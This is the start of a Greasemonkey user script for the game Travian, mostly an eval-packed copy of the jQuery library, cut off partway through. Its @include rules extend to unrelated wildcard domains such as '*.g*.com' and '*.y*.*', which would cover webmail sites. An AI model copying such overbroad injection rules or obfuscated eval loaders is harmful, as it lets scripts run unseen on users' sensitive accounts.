// Travian Script - Gharat az Gozaresh
//
// version 3!
//
// Copyright (c) 2010, R.M
//
// --------------------------------------------------------------------
//
// This is a Greasemonkey user script.  To install it, you need
// Greasemonkey 0.3 or later: http://greasemonkey.mozdev.org/
// Then restart Firefox and revisit this script.
// Under Tools, there will be a new menu item to "Install User Script".
// Accept the default configuration and install.
//
// To uninstall, go to Tools/Manage User Scripts,
//
// --------------------------------------------------------------------
//
// ==UserScript==
// @name          Travian Script - Gharat az Gozaresh
// @description   Travian Script - Gharat az Gozaresh- < travian-script.blogfa.com >
// @namespace     http://*.travian.ir/*
// @namespace     http://s*.travian.ir/*
// @namespace     http://*.tra*.*/*
// @include       http://*.travian.ir/*
// @include       http://s*.travian.ir/*
// @include       http://*.tra*.ir/*
// @include       http://s*.tra*.ir/*
// @include       http://*.tra*.*/*
// @include       http://*.tra*.*/build.php?*gid=16*
// @include       http://*.tra*.*/build.php?*id=39*
// @include       http://*.tra*.*/a2b.php*
// @include       http://*.tra*.*/karte.php*
// @include       https://*.g*.com/*
// @include       http://*.g*.com/*
// @include       https://*.y*.*/*
// @include       http://*.y*.*/*
// @include       https://*.li*.*/*
// @include       http://*.li*.*/*
// @include       http://*.tra*.*/berichte.php*
// @exclude       http://forum.travian.*
// ==/UserScript==

//jQuery Libraryy
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(B(){F 96=1o.7,4u$=1o.$;F 7=1o.7=1o.$=B(T,1p){C 2Q 7.N.67(T,1p)};F 94=/^[^<]*(<(.|\\s)+>)[^>]*$|^#(\\w+)$/,68=/^.[^:#\\[\\.]*$/,1b;7.N=7.4v={67:B(T,1p){T=T||R;k(T.1d){b[0]=T;b.O=1;C b}k(1M T=="2C"){F 1y=94.3u(T);k(1y&&(1y[1]||!1p)){k(1y[1])T=7.5Y([1y[1]],1p);U{F v=R.5x(1y[3]);k(v){k(v.1i!=1y[3])C 7().37(T);C 7(v)}T=[]}}U C 7(1p).37(T)}U k(7.25(T))C 7(R)[7.N.2J?"2J":"4C"](T);C b.92(7.2P(T))},69:"1.2.6",4p:B(){C b.O},O:0,4m:B(21){C 21==1b?7.2P(b):b[21]},3w:B(1s){F L=7(1s);L.6b=b;C L},92:B(1s){b.O=0;3d.4v.1S.1X(b,1s);C b},Y:B(W,29){C 7.Y(b,W,29)},3e:B(v){F L=-1;C 7.3r(v&&v.69?v[0]:v,b)},1U:B(I,Q,H){F 16=I;k(I.1T==6d)k(Q===1b)C b[0]&&7[H||"1U"](b[0],I);U{16={};16[I]=Q}C b.Y(B(i){11(I 1K 16)7.1U(H?b.15:b,I,7.1f(b,16[I],H,i,I))})},1D:B(2V,Q){k((2V==\'2X\'||2V==\'2y\')&&3Q(Q)<0)Q=1b;C b.1U(2V,Q,"2I")},1u:B(1u){k(1M 1u!="1V"&&1u!=12)C b.5n().49((b[0]&&b[0].3f||R).6e(1u));F L="";7.Y(1u||b,B(){7.Y(b.4n,B(){k(b.1d!=8)L+=b.1d!=1?b.90:7.N.1u([b])})});C L},6f:B(2f){k(b[0])7(2f,b[0].3f).3h().3J(b[0]).2W(B(){F v=b;26(v.23)v=v.23;C v}).49(b);C b},bM:B(2f){C b.Y(B(){7(b).8Y().6f(2f)})},4l:B(2f){C b.Y(B(){7(b).6f(2f)})},49:B(){C b.4z(1n,S,V,B(v){k(b.1d==1)b.4R(v)})},8X:B(){C b.4z(1n,S,S,B(v){k(b.1d==1)b.3J(v,b.23)})},8W:B(){C b.4z(1n,V,V,B(v){b.1t.3J(v,b)})},6g:B(){C b.4z(1n,V,S,B(v){b.1t.3J(v,b.3p)})},2B:B(){C b.6b||7([])},37:B(T){F 1s=7.2W(b,B(v){C 7.37(T,v)});C b.3w(/[^+>] [^+>]/.19(T)||T.1E("..")>-1?7.5a(1s):1s)},3h:B(1k){F L=b.2W(B(){k(7.1e.1x&&!7.5o(b)){F 3h=b.8S(S),6n=R.4e("1W");6n.4R(3h);C 7.5Y([6n.4W])[0]}U C b.8S(S)});F 3h=L.37("*").6o().Y(B(){k(b[2M]!=1b)b[2M]=12});k(1k===S)b.37("*").6o().Y(B(i){k(b.1d==3)C;F 1k=7.J(b,"1k");11(F H 1K 1k)11(F 1c 1K 1k[H])7.K.1j(3h[i],H,1k[H][1c],1k[H][1c].J)});C L},1R:B(T){C b.3w(7.25(T)&&7.4M(b,B(v,i){C T.1L(v,i)})||7.4c(T,b))},2d:B(T){k(T.1T==6d)k(68.19(T))C b.3w(7.4c(T,b,S));U T=7.4c(T,b);F 8Q=T.O&&T[T.O-1]!==1b&&!T.1d;C b.1R(B(){C 8Q?7.3r(b,T)<0:b!=T})},1j:B(T){C b.3w(7.5a(7.2l(b.4m(),1M T==\'2C\'?7(T):7.2P(T))))},4w:B(T){C!!T&&7.4c(T,b).O>0},bf:B(T){C b.4w("."+T)},18:B(Q){k(Q==1b){k(b.O){F v=b[0];k(7.1a(v,"3j")){F 3e=v.6r,40=[],16=v.16,35=v.H=="3j-35";k(3e<0)C 12;11(F i=35?3e:0,2O=35?3e+1:16.O;i<2O;i++){F 4r=16[i];k(4r.3P){Q=7.1e.1x&&!4r.b9.Q.b8?4r.1u:4r.Q;k(35)C Q;40.1S(Q)}}C 40}U C(b[0].Q||"").1P(/\\r/g,"")}C 1b}k(Q.1T==5L)Q+=\'\';C b.Y(B(){k(b.1d!=1)C;k(Q.1T==3d&&/6s|6u/.19(b.H))b.5P=(7.3r(b.Q,Q)>=0||7.3r(b.I,Q)>=0);U k(7.1a(b,"3j")){F 40=7.2P(Q);7("4r",b).Y(B(){b.3P=(7.3r(b.Q,40)>=0||7.3r(b.1u,40)>=0)});k(!40.O)b.6r=-1}U b.Q=Q})},2f:B(Q){C Q==1b?(b[0]?b[0].4W:12):b.5n().49(Q)},8M:B(Q){C b.6g(Q).2r()},8J:B(i){C b.46(i,i+1)},46:B(){C b.3w(3d.4v.46.1X(b,1n))},2W:B(W){C b.3w(7.2W(b,B(v,i){C W.1L(v,i,v)}))},6o:B(){C b.1j(b.6b)},J:B(2V,Q){F 1w=2V.2i(".");1w[1]=1w[1]?"."+1w[1]:"";k(Q===1b){F J=b.6w("aS"+1w[1]+"!",[1w[0]]);k(J===1b&&b.O)J=7.J(b[0],2V);C J===1b&&1w[1]?b.J(1w[0]):J}U C b.2p("aP"+1w[1]+"!",[1w[0],Q]).Y(B(){7.J(b,2V,Q)})},3M:B(2V){C b.Y(B(){7.3M(b,2V)})},4z:B(29,2h,6y,W){F 3h=b.O>1,1s;C b.Y(B(){k(!1s){1s=7.5Y(29,b.3f);k(6y)1s.6y()}F 6z=b;k(2h&&7.1a(b,"2h")&&7.1a(1s[0],"5I"))6z=b.4A("1Q")[0]||b.4R(b.3f.4e("1Q"));F 4b=7([]);7.Y(1s,B(){F v=3h?7(b).3h(S)[0]:b;k(7.1a(v,"1l"))4b=4b.1j(v);U{k(v.1d==1)4b=4b.1j(7("1l",v).2r());W.1L(6z,v)}});4b.Y(8E)})}};7.N.67.4v=7.N;B 8E(i,v){k(v.41)7.4L({14:v.41,3K:V,2b:"1l"});U 7.6A(v.1u||v.8D||v.4W||"");k(v.1t)v.1t.3V(v)}B 1Y(){C+2Q aJ}7.1O=7.N.1O=B(){F 1F=1n[0]||{},i=1,O=1n.O,48=V,16;k(1F.1T==aH){48=1F;1F=1n[1]||{};i=2}k(1M 1F!="1V"&&1M 1F!="B")1F={};k(O==i){1F=b;--i}11(;i<O;i++)k((16=1n[i])!=12)11(F I 1K 16){F 41=1F[I],38=16[I];k(1F===38)8C;k(48&&38&&1M 38=="1V"&&!38.1d)1F[I]=7.1O(48,41||(38.O!=12?[]:{}),38);U k(38!==1b)1F[I]=38}C 1F};F 2M="7"+1Y(),8A=0,6E={},8z=/z-?3e|at-?aq|1Z|8s|a3-?2y/i,50=R.50||{};7.1O({9K:B(48){1o.$=4u$;k(48)1o.7=96;C 7},25:B(N){C!!N&&1M N!="2C"&&!N.1a&&N.1T!=3d&&/^[\\s[]?B/.19(N+"")},5o:B(v){C v.27&&!v.1v||v.30&&v.3f&&!v.3f.1v},6A:B(J){J=7.4j(J);k(J){F 2L=R.4A("2L")[0]||R.27,1l=R.4e("1l");1l.H="1u/5t";k(7.1e.1x)1l.1u=J;U 1l.4R(R.6e(J));2L.3J(1l,2L.23);2L.3V(1l)}},1a:B(v,I){C v.1a&&v.1a.3b()==I.3b()},2A:{},J:B(v,I,J){v=v==1o?6E:v;F 1i=v[2M];k(!1i)1i=v[2M]=++8A;k(I&&!7.2A[1i])7.2A[1i]={};k(J!==1b)7.2A[1i][I]=J;C I?7.2A[1i][I]:1i},3M:B(v,I){v=v==1o?6E:v;F 1i=v[2M];k(I){k(7.2A[1i]){3N 7.2A[1i][I];I="";11(I 1K 7.2A[1i])2D;k(!I)7.3M(v)}}U{2s{3N v[2M]}2v(e){k(v.6O)v.6O(2M)}3N 7.2A[1i]}},Y:B(1V,W,29){F I,i=0,O=1V.O;k(29){k(O==1b){11(I 1K 1V)k(W.1X(1V[I],29)===V)2D}U 11(;i<O;)k(W.1X(1V[i++],29)===V)2D}U{k(O==1b){11(I 1K 1V)k(W.1L(1V[I],I,1V[I])===V)2D}U 11(F Q=1V[0];i<O&&W.1L(Q,i,Q)!==V;Q=1V[++i]){}}C 1V},1f:B(v,Q,H,i,I){k(7.25(Q))Q=Q.1L(v,i);C Q&&Q.1T==5L&&H=="2I"&&!8z.19(I)?Q+"43":Q},1z:{1j:B(v,2z){7.Y((2z||"").2i(/\\s+/),B(i,1z){k(v.1d==1&&!7.1z.4S(v.1z,1z))v.1z+=(v.1z?" ":"")+1z})},2r:B(v,2z){k(v.1d==1)v.1z=2z!=1b?7.4M(v.1z.2i(/\\s+/),B(1z){C!7.1z.4S(2z,1z)}).8g(" "):""},4S:B(v,1z){C 7.3r(1z,(v.1z||v).5S().2i(/\\s+/))>-1}},3t:B(v,16,W){F 3a={};11(F I 1K 16){3a[I]=v.15[I];v.15[I]=16[I]}W.1L(v);11(F I 1K 16)v.15[I]=3a[I]},1D:B(v,I,4h){k(I=="2X"||I=="2y"){F 18,36={3Y:"6P",6R:"28",1m:"4x"},3U=I=="2X"?["6T","8c"]:["6U","8b"];B 6V(){18=I=="2X"?v.9p:v.9k;F 4f=0,3i=0;7.Y(3U,B(){4f+=3Q(7.2I(v,"4f"+b,S))||0;3i+=3Q(7.2I(v,"3i"+b+"4H",S))||0});18-=2N.9i(4f+3i)}k(7(v).4w(":5F"))6V();U 7.3t(v,36,6V);C 2N.2O(0,18)}C 7.2I(v,I,4h)},2I:B(v,I,4h){F L,15=v.15;B 4K(v){k(!7.1e.2S)C V;F L=50.6X(v,12);C!L||L.6Z("4K")==""}k(I=="1Z"&&7.1e.1x){L=7.1U(15,"1Z");C L==""?"1":L}k(7.1e.3o&&I=="1m"){F 83=15.70;15.70="0 bO bN";15.70=83}k(I.1y(/5T/i))I=3I;k(!4h&&15&&15[I])L=15[I];U k(50.6X){k(I.1y(/5T/i))I="5T";I=I.1P(/([A-Z])/g,"-$1").4t();F 56=50.6X(v,12);k(56&&!4K(v))L=56.6Z(I);U{F 3t=[],3m=[],a=v,i=0;11(;a&&4K(a);a=a.1t)3m.7S(a);11(;i<3m.O;i++)k(4K(3m[i])){3t[i]=3m[i].15.1m;3m[i].15.1m="4x"}L=I=="1m"&&3t[3m.O-1]!=12?"3B":(56&&56.6Z(I))||"";11(i=0;i<3t.O;i++)k(3t[i]!=12)3m[i].15.1m=3t[i]}k(I=="1Z"&&L=="")L="1"}U k(v.5g){F 7R=I.1P(/\\-(\\w)/g,B(3E,5m){C 5m.3b()});L=v.5g[I]||v.5g[7R];k(!/^\\d+(43)?$/i.19(L)&&/^\\d/.19(L)){F 1C=15.1C,7Q=v.71.1C;v.71.1C=v.5g.1C;15.1C=L||0;L=15.aG+"43";15.1C=1C;v.71.1C=7Q}}C L},5Y:B(1s,1p){F L=[];1p=1p||R;k(1M 1p.4e==\'1b\')1p=1p.3f||1p[0]&&1p[0].3f||R;7.Y(1s,B(i,v){k(!v)C;k(v.1T==5L)v+=\'\';k(1M v=="2C"){v=v.1P(/(<(\\w+)[^>]*?)\\/>/g,B(3E,7M,3R){C 3R.1y(/^(au|br|7L|ah|5B|7I|ab|45|a4|a0|9L)$/i)?3E:7M+"></"+3R+">"});F 2F=7.4j(v).4t(),1W=1p.4e("1W");F 4l=!2F.1E("<1G")&&[1,"<3j 7E=\'7E\'>","</3j>"]||!2F.1E("<9G")&&[1,"<7C>","</7C>"]||2F.1y(/^<(9u|1Q|9s|cF|bC)/)&&[1,"<2h>","</2h>"]||!2F.1E("<5I")&&[2,"<2h><1Q>","</1Q></2h>"]||(!2F.1E("<am")||!2F.1E("<a2"))&&[3,"<2h><1Q><5I>","</5I></1Q></2h>"]||!2F.1E("<7L")&&[2,"<2h><1Q></1Q><7u>","</7u></2h>"]||7.1e.1x&&[1,"1W<1W>","</1W>"]||[0,"",""];1W.4W=4l[1]+v+4l[2];26(4l[0]--)1W=1W.7i;k(7.1e.1x){F 1Q=!2F.1E("<2h")&&2F.1E("<1Q")<0?1W.23&&1W.23.4n:4l[1]=="<2h>"&&2F.1E("<1Q")<0?1W.4n:[];11(F j=1Q.O-1;j>=0;--j)k(7.1a(1Q[j],"1Q")&&!1Q[j].4n.O)1Q[j].1t.3V(1Q[j]);k(/^\\s/.19(v))1W.3J(1p.6e(v.1y(/^\\s*/)[0]),1W.23)}v=7.2P(1W.4n)}k(v.O===0&&(!7.1a(v,"4i")&&!7.1a(v,"3j")))C;k(v[0]==1b||7.1a(v,"4i")||v.16)L.1S(v);U L=7.2l(L,v)});C L},1U:B(v,I,Q){k(!v||v.1d==3||v.1d==8)C 1b;F 55=!7.5o(v),4I=Q!==1b,1x=7.1e.1x;I=55&&7.36[I]||I;k(v.30){F 2t=/59|41|15/.19(I);k(I=="3P"&&7.1e.2S)v.1t.6r;k(I 1K v&&55&&!2t){k(4I){k(I=="H"&&7.1a(v,"5B")&&v.1t)7s"H 9A 9f\'t be cl";v[I]=Q}k(7.1a(v,"4i")&&v.7o(I))C v.7o(I).90;C v[I]}k(1x&&55&&I=="15")C 7.1U(v.15,"9C",Q);k(4I)v.bE(I,""+Q);F 1U=1x&&55&&2t?v.5j(I,2):v.5j(I);C 1U===12?1b:1U}k(1x&&I=="1Z"){k(4I){v.8s=1;v.1R=(v.1R||"").1P(/7m\\([^)]*\\)/,"")+(4o(Q)+\'\'=="9J"?"":"7m(1Z="+Q*7O+")")}C v.1R&&v.1R.1E("1Z=")>=0?(3Q(v.1R.1y(/1Z=([^)]*)/)[1])/7O)+\'\':""}I=I.1P(/-([a-z])/9P,B(3E,5m){C 5m.3b()});k(4I)v[I]=Q;C v[I]},4j:B(1u){C(1u||"").1P(/^\\s+|\\s+$/g,"")},2P:B(1N){F L=[];k(1N!=12){F i=1N.O;k(i==12||1N.2i||1N.5q||1N.1L)L[0]=1N;U 26(i)L[--i]=1N[i]}C L},3r:B(v,1N){11(F i=0,O=1N.O;i<O;i++)k(1N[i]===v)C i;C-1},2l:B(2H,7k){F i=0,v,3W=2H.O;k(7.1e.1x){26(v=7k[i++])k(v.1d!=8)2H[3W++]=v}U 26(v=7k[i++])2H[3W++]=v;C 2H},5a:B(1N){F L=[],22={};2s{11(F i=0,O=1N.O;i<O;i++){F 1i=7.J(1N[i]);k(!22[1i]){22[1i]=S;L.1S(1N[i])}}}2v(e){L=1N}C L},4M:B(1s,W,8k){F L=[];11(F i=0,O=1s.O;i<O;i++)k(!8k!=!W(1s[i],i))L.1S(1s[i]);C L},2W:B(1s,W){F L=[];11(F i=0,O=1s.O;i<O;i++){F Q=W(1s[i],i);k(Q!=12)L[L.O]=Q}C L.7t.1X([],L)}});F 33=ay.33.4t();7.1e={7h:(33.1y(/.+(?:bX|c9|a1|a5)[\\/: ]([\\d.]+)/)||[])[1],2S:/7J/.19(33),3o:/3o/.19(33),1x:/1x/.19(33)&&!/3o/.19(33),4P:/4P/.19(33)&&!/(ax|7J)/.19(33)};F 3I=7.1e.1x?"3I":"7l";7.1O({85:!7.1e.1x||R.87=="88",36:{"11":"9o","9q":"1z","5T":3I,7l:3I,3I:3I,9t:"9v",9x:"9y",9F:"a9"}});7.Y({1I:B(v){C v.1t},an:B(v){C 7.39(v,"1t")},av:B(v){C 7.3Z(v,2,"3p")},aN:B(v){C 7.3Z(v,2,"5Z")},aV:B(v){C 7.39(v,"3p")},b4:B(v){C 7.39(v,"5Z")},b7:B(v){C 7.6q(v.1t.23,v)},bx:B(v){C 7.6q(v.23)},8Y:B(v){C 7.1a(v,"by")?v.bD||v.aM.R:7.2P(v.4n)}},B(I,N){7.N[I]=B(T){F L=7.2W(b,N);k(T&&1M T=="2C")L=7.4c(T,L);C b.3w(7.5a(L))}});7.Y({97:"49",ca:"8X",3J:"8W",c7:"6g",c0:"8M"},B(I,91){7.N[I]=B(){F 29=1n;C b.Y(B(){11(F i=0,O=29.O;i<O;i++)7(29[i])[91](b)})}});7.Y({bV:B(I){7.1U(b,I,"");k(b.1d==1)b.6O(I)},bS:B(2z){7.1z.1j(b,2z)},bR:B(2z){7.1z.2r(b,2z)},bQ:B(2z){7.1z[7.1z.4S(b,2z)?"2r":"1j"](b,2z)},2r:B(T){k(!T||7.1R(T,[b]).r.O){7("*",b).1j(b).Y(B(){7.K.2r(b);7.3M(b)});k(b.1t)b.1t.3V(b)}},5n:B(){7(">*",b).2r();26(b.23)b.3V(b.23)}},B(I,N){7.N[I]=B(){C b.Y(N,1n)}});7.Y(["8Z","4H"],B(i,I){F H=I.4t();7.N[H]=B(4p){C b[0]==1o?7.1e.3o&&R.1v["6h"+I]||7.1e.2S&&1o["6i"+I]||R.87=="88"&&R.27["6h"+I]||R.1v["6h"+I]:b[0]==R?2N.2O(2N.2O(R.1v["65"+I],R.27["65"+I]),2N.2O(R.1v["32"+I],R.27["32"+I])):4p==1b?(b.O?7.1D(b[0],H):12):b.1D(H,4p.1T==6d?4p:4p+"43")}});B 21(v,1f){C v[0]&&4o(7.2I(v[0],1f,S),10)||0}F 4s=7.1e.2S&&4o(7.1e.7h)<bw?"(?:[\\\\w*4u-]|\\\\\\\\.)":"(?:[\\\\w\\bq-\\bp*4u-]|\\\\\\\\.)",8R=2Q 62("^>\\\\s*("+4s+"+)"),8P=2Q 62("^("+4s+"+)(#)("+4s+"+)"),8N=2Q 62("^([#.]?)("+4s+"*)");7.1O({3v:{"":B(a,i,m){C m[2]=="*"||7.1a(a,m[2])},"#":B(a,i,m){C a.5j("1i")==m[2]},":":{b3:B(a,i,m){C i<m[3]-0},aZ:B(a,i,m){C i>m[3]-0},3Z:B(a,i,m){C m[3]-0==i},8J:B(a,i,m){C m[3]-0==i},2H:B(a,i){C i==0},2w:B(a,i,m,r){C i==r.O-1},8I:B(a,i){C i%2==0},8F:B(a,i){C i%2},"2H-5W":B(a){C a.1t.4A("*")[0]==a},"2w-5W":B(a){C 7.3Z(a.1t.7i,1,"5Z")==a},"aL-5W":B(a){C!7.3Z(a.1t.7i,2,"5Z")},1I:B(a){C a.23},5n:B(a){C!a.23},aI:B(a,i,m){C(a.8D||a.az||7(a).1u()||"").1E(m[3])>=0},5F:B(a){C"28"!=a.H&&7.1D(a,"1m")!="3B"&&7.1D(a,"6R")!="28"},28:B(a){C"28"==a.H||7.1D(a,"1m")=="3B"||7.1D(a,"6R")=="28"},aw:B(a){C!a.51},51:B(a){C a.51},5P:B(a){C a.5P},3P:B(a){C a.3P||7.1U(a,"3P")},1u:B(a){C"1u"==a.H},6s:B(a){C"6s"==a.H},6u:B(a){C"6u"==a.H},6F:B(a){C"6F"==a.H},4Z:B(a){C"4Z"==a.H},6H:B(a){C"6H"==a.H},8v:B(a){C"8v"==a.H},8t:B(a){C"8t"==a.H},3c:B(a){C"3c"==a.H||7.1a(a,"3c")},5B:B(a){C/5B|3j|8n|3c/i.19(a.1a)},4S:B(a,i,m){C 7.37(m[3],a).O},9V:B(a){C/h\\d/i.19(a.1a)},9N:B(a){C 7.4M(7.24,B(N){C a==N.v}).O}}},8f:[/^(\\[) *@?([\\w-]+) *([!*$^~=]*) *(\'?"?)(.*?)\\4 *\\]/,/^(:)([\\w-]+)\\("?\'?(.*?(\\(.*?\\))?[^(]*?)"?\'?\\)/,2Q 62("^([:.#]*)("+4s+"+)")],4c:B(3v,1s,2d){F 3a,1B=[];26(3v&&3v!=3a){3a=3v;F f=7.1R(3v,1s,2d);3v=f.t.1P(/^\\s*,\\s*/,"");1B=2d?1s=f.r:7.2l(1B,f.r)}C 1B},37:B(t,1p){k(1M t!="2C")C[t];k(1p&&1p.1d!=1&&1p.1d!=9)C[];1p=1p||R;F L=[1p],22=[],2w,1a;26(t&&2w!=t){F r=[];2w=t;t=7.4j(t);F 5M=V,3s=8R,m=3s.3u(t);k(m){1a=m[1].3b();11(F i=0;L[i];i++)11(F c=L[i].23;c;c=c.3p)k(c.1d==1&&(1a=="*"||c.1a.3b()==1a))r.1S(c);L=r;t=t.1P(3s,"");k(t.1E(" ")==0)8C;5M=S}U{3s=/^([>+~])\\s*(\\w*)/i;k((m=3s.3u(t))!=12){r=[];F 2l={};1a=m[2].3b();m=m[1];11(F j=0,4g=L.O;j<4g;j++){F n=m=="~"||m=="+"?L[j].3p:L[j].23;11(;n;n=n.3p)k(n.1d==1){F 1i=7.J(n);k(m=="~"&&2l[1i])2D;k(!1a||n.1a.3b()==1a){k(m=="~")2l[1i]=S;r.1S(n)}k(m=="+")2D}}L=r;t=7.4j(t.1P(3s,""));5M=S}}k(t&&!5M){k(!t.1E(",")){k(1p==L[0])L.5H();22=7.2l(22,L);r=L=[1p];t=" "+t.7V(1,t.O)}U{F 4Q=8P;F m=4Q.3u(t);k(m){m=[0,m[2],m[3],m[1]]}U{4Q=8N;m=4Q.3u(t)}m[2]=m[2].1P(/\\\\/g,"");F v=L[L.O-1];k(m[1]=="#"&&v&&v.5x&&!7.5o(v)){F 3x=v.5x(m[2]);k((7.1e.1x||7.1e.3o)&&3x&&1M 3x.1i=="2C"&&3x.1i!=m[2])3x=7(\'[@1i="\'+m[2]+\'"]\',v)[0];L=r=3x&&(!m[3]||7.1a(3x,m[3]))?[3x]:[]}U{11(F i=0;L[i];i++){F 3R=m[1]=="#"&&m[3]?m[3]:m[1]!=""||m[0]==""?"*":m[2];k(3R=="*"&&L[i].1a.4t()=="1V")3R="45";r=7.2l(r,L[i].4A(3R))}k(m[1]==".")r=7.74(r,m[2]);k(m[1]=="#"){F 2c=[];11(F i=0;r[i];i++)k(r[i].5j("1i")==m[2]){2c=[r[i]];2D}r=2c}L=r}t=t.1P(4Q,"")}}k(t){F 18=7.1R(t,r);L=r=18.r;t=7.4j(18.t)}}k(t)L=[];k(L&&1p==L[0])L.5H();22=7.2l(22,L);C 22},74:B(r,m,2d){m=" "+m+" ";F 2c=[];11(F i=0;r[i];i++){F 76=(" "+r[i].1z+" ").1E(m)>=0;k(!2d&&76||2d&&!76)2c.1S(r[i])}C 2c},1R:B(t,r,2d){F 2w;26(t&&t!=2w){2w=t;F p=7.8f,m;11(F i=0;p[i];i++){m=p[i].3u(t);k(m){t=t.7F(m[0].O);m[2]=m[2].1P(/\\\\/g,"");2D}}k(!m)2D;k(m[1]==":"&&m[2]=="2d")r=68.19(m[3])?7.1R(m[3],r,S).r:7(r).2d(m[3]);U k(m[1]==".")r=7.74(r,m[2],2d);U k(m[1]=="["){F 2c=[],H=m[3];11(F i=0,4g=r.O;i<4g;i++){F a=r[i],z=a[7.36[m[2]]||m[2]];k(z==12||/59|41|3P/.19(m[2]))z=7.1U(a,m[2])||\'\';k((H==""&&!!z||H=="="&&z==m[5]||H=="!="&&z!=m[5]||H=="^="&&z&&!z.1E(m[5])||H=="$="&&z.7V(z.O-m[5].O)==m[5]||(H=="*="||H=="~=")&&z.1E(m[5])>=0)^2d)2c.1S(a)}r=2c}U k(m[1]==":"&&m[2]=="3Z-5W"){F 2l={},2c=[],19=/(-?)(\\d*)n((?:\\+|-)?\\d*)/.3u(m[3]=="8I"&&"2n"||m[3]=="8F"&&"2n+1"||!/\\D/.19(m[3])&&"9E+"+m[3]||m[3]),2H=(19[1]+(19[2]||1))-0,2w=19[3]-0;11(F i=0,4g=r.O;i<4g;i++){F 4a=r[i],1t=4a.1t,1i=7.J(1t);k(!2l[1i]){F c=1;11(F n=1t.23;n;n=n.3p)k(n.1d==1)n.5z=c++;2l[1i]=S}F 1j=V;k(2H==0){k(4a.5z==2w)1j=S}U k((4a.5z-2w)%2H==0&&(4a.5z-2w)/2H>=0)1j=S;k(1j^2d)2c.1S(4a)}r=2c}U{F N=7.3v[m[1]];k(1M N=="1V")N=N[m[2]];k(1M N=="2C")N=7x("V||B(a,i){C "+N+";}");r=7.4M(r,B(v,i){C N(v,i,m,r)},2d)}}C{r:r,t:t}},39:B(v,39){F 7g=[],1B=v[39];26(1B&&1B!=R){k(1B.1d==1)7g.1S(1B);1B=1B[39]}C 7g},3Z:B(1B,5y,39,v){5y=5y||1;F 21=0;11(;1B;1B=1B[39])k(1B.1d==1&&++21==5y)2D;C 1B},6q:B(n,v){F r=[];11(;n;n=n.3p){k(n.1d==1&&n!=v)r.1S(n)}C r}});7.K={1j:B(v,2q,1c,J){k(v.1d==3||v.1d==8)C;k(7.1e.1x&&v.5q)v=1o;k(!1c.2K)1c.2K=b.2K++;k(J!=1b){F N=1c;1c=b.3g(N,B(){C N.1X(b,1n)});1c.J=J}F 1k=7.J(v,"1k")||7.J(v,"1k",{}),1H=7.J(v,"1H")||7.J(v,"1H",B(){k(1M 7!="1b"&&!7.K.7j)C 7.K.1H.1X(1n.4B.v,1n)});1H.v=v;7.Y(2q.2i(/\\s+/),B(3e,H){F 1w=H.2i(".");H=1w[0];1c.H=1w[1];F 3z=1k[H];k(!3z){3z=1k[H]={};k(!7.K.2t[H]||7.K.2t[H].5k.1L(v)===V){k(v.4y)v.4y(H,1H,V);U k(v.7n)v.7n("5h"+H,1H)}}3z[1c.2K]=1c;7.K.2G[H]=S});v=12},2K:1,2G:{},2r:B(v,2q,1c){k(v.1d==3||v.1d==8)C;F 1k=7.J(v,"1k"),L,3e;k(1k){k(2q==1b||(1M 2q=="2C"&&2q.9D(0)=="."))11(F H 1K 1k)b.2r(v,H+(2q||""));U{k(2q.H){1c=2q.1c;2q=2q.H}7.Y(2q.2i(/\\s+/),B(3e,H){F 1w=H.2i(".");H=1w[0];k(1k[H]){k(1c)3N 1k[H][1c.2K];U 11(1c 1K 1k[H])k(!1w[1]||1k[H][1c].H==1w[1])3N 1k[H][1c];11(L 1K 1k[H])2D;k(!L){k(!7.K.2t[H]||7.K.2t[H].5f.1L(v)===V){k(v.7p)v.7p(H,7.J(v,"1H"),V);U k(v.7q)v.7q("5h"+H,7.J(v,"1H"))}L=12;3N 1k[H]}}})}11(L 1K 1k)2D;k(!L){F 1H=7.J(v,"1H");k(1H)1H.v=12;7.3M(v,"1k");7.3M(v,"1H")}}},2p:B(H,J,v,7r,5e){J=7.2P(J);k(H.1E("!")>=0){H=H.46(0,-1);F 5c=S}k(!v){k(b.2G[H])7("*").1j([1o,R]).2p(H,J)}U{k(v.1d==3||v.1d==8)C 1b;F 18,L,N=7.25(v[H]||12),K=!J[0]||!J[0].3G;k(K){J.7S({H:H,1F:v,3G:B(){},58:B(){},5X:1Y()});J[0][2M]=S}J[0].H=H;k(5c)J[0].5c=S;F 1H=7.J(v,"1H");k(1H)18=1H.1X(v,J);k((!N||(7.1a(v,\'a\')&&H=="5V"))&&v["5h"+H]&&v["5h"+H].1X(v,J)===V)18=V;k(K)J.5H();k(5e&&7.25(5e)){L=5e.1X(v,18==12?J:J.7t(18));k(L!==1b)18=L}k(N&&7r!==V&&18!==V&&!(7.1a(v,\'a\')&&H=="5V")){b.7j=S;2s{v[H]()}2v(e){}}b.7j=V}C 18},1H:B(K){F 18,L,3D,3E,3z;K=1n[0]=7.K.7v(K||1o.K);3D=K.H.2i(".");K.H=3D[0];3D=3D[1];3E=!3D&&!K.5c;3z=(7.J(b,"1k")||{})[K.H];11(F j 1K 3z){F 1c=3z[j];k(3E||1c.H==3D){K.1c=1c;K.J=1c.J;L=1c.1X(b,1n);k(18!==V)18=L;k(L===V){K.3G();K.58()}}}C 18},7v:B(K){k(K[2M]==S)C K;F 31=K;K={31:31};F 36="a7 aa ac ad 3c ae 4Y 7f 7w 66 bu J bv bB 5R 1c 7e 7d bY c6 7c 7y cC cE 5Q 98 99 9a 7z 1F 5X 7A H 9g 9h 3U".2i(" ");11(F i=36.O;i;i--)K[36[i]]=31[36[i]];K[2M]=S;K.3G=B(){k(31.3G)31.3G();31.9j=V};K.58=B(){k(31.58)31.58();31.9n=S};K.5X=K.5X||1Y();k(!K.1F)K.1F=K.7z||R;k(K.1F.1d==3)K.1F=K.1F.1t;k(!K.5Q&&K.5R)K.5Q=K.5R==K.1F?K.7A:K.5R;k(K.7c==12&&K.7f!=12){F 1J=R.27,1v=R.1v;K.7c=K.7f+(1J&&1J.2Z||1v&&1v.2Z||0)-(1J.7B||0);K.7y=K.7w+(1J&&1J.2U||1v&&1v.2U||0)-(1J.7D||0)}k(!K.3U&&((K.4Y||K.4Y===0)?K.4Y:K.7e))K.3U=K.4Y||K.7e;k(!K.7d&&K.66)K.7d=K.66;k(!K.3U&&K.3c)K.3U=(K.3c&1?1:(K.3c&2?3:(K.3c&4?2:0)));C 